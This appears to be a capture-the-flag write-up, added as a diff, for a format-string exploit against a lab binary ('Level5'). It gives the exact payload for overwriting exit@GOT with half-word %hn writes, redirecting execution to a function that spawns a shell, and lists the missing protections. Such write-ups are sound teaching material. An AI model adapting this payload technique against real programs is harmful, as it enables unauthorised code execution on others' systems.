@@ -1,0 +1,68 @@
+GOT Overwrite Analysis - Level5
+================================
+
+Target Addresses:
+-----------------
+Function o():        0x080484a4
+exit@GOT:           0x08049838
+exit@GOT+2:         0x0804983a
+
+Objective:
+----------
+Overwrite exit@GOT (0x08049838) with address of o() (0x080484a4)
+When program calls exit(), it will execute o() instead → shell spawned
+
+Half-Word Write Strategy:
+--------------------------
+Split 0x080484a4 into two 16-bit halves:
+- Low half:  0x84a4 (33956 decimal)
+- High half: 0x0804 (2052 decimal)
+
+Write in ascending order to avoid wrap-around:
+1. Write 0x0804 to 0x0804983a (high half)
+2. Write 0x84a4 to 0x08049838 (low half)
+
+Stack Layout:
+-------------
+User input buffer starts at stack position %4$
+- %4$ = first 4 bytes of input
+- %5$ = second 4 bytes of input
+
+Payload Structure:
+------------------
+[0x0804983a][0x08049838]%2044x%4$hn%31904x%5$hn
+
+Breakdown:
+1. 0x0804983a (4 bytes) - target address for high half
+2. 0x08049838 (4 bytes) - target address for low half
+3. %2044x - print 2044 characters (total: 8 + 2044 = 2052)
+4. %4$hn - write 2052 (0x0804) to address at %4$ (0x0804983a)
+5. %31904x - print 31904 more characters (total: 2052 + 31904 = 33956)
+6. %5$hn - write 33956 (0x84a4) to address at %5$ (0x08049838)
+
+Result:
+-------
+exit@GOT now contains: 0x080484a4 (address of o())
+When exit() is called → jumps to o() → system("/bin/sh") → shell
+
+Format String Specifiers Used:
+-------------------------------
+%x  - print hexadecimal value
+%hn - write half-word (2 bytes) to address
+%4$ - access 4th parameter on stack
+%5$ - access 5th parameter on stack
+
+GOT (Global Offset Table):
+---------------------------
+- Contains addresses of dynamically linked functions
+- Populated by dynamic linker at runtime
+- Without RELRO protection, GOT is writable
+- Overwriting GOT entries redirects function calls
+
+Protection Analysis:
+--------------------
+No RELRO:  GOT is writable
+No PIE:    Addresses are predictable
+No Canary: Stack overflow protection disabled
+NX disabled: Stack is executable (not needed for this exploit)
+
